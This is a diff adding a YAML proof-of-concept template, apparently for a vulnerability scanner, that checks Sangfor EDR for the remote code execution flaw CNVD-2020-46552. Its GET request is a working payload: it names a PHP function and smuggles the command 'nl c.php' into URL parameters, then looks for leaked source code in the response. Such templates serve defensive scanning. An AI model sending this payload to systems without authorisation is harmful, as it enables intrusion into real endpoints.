@@ -1,0 +1,23 @@
+id: poc-yaml-sangfor-edr-rce-cnvd-2020-46552
+info:
+  name: Sangfor EDR 远程代码执行漏洞(CNVD-2020-46552)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CNVD-2020-46552
+  finger: sangfor
+requests:
+- method: GET
+  path: /tool/log/c.php?strip_slashes=printf&host=nl+c.php
+  expression: 'status_code == 200 &&
+
+    contains(body, "$show_input = function($info)") &&
+
+    contains(body, "$strip_slashes($host)") &&
+
+    contains(body, "Log Helper")
+
+    '
+variables: {}
+transport: http
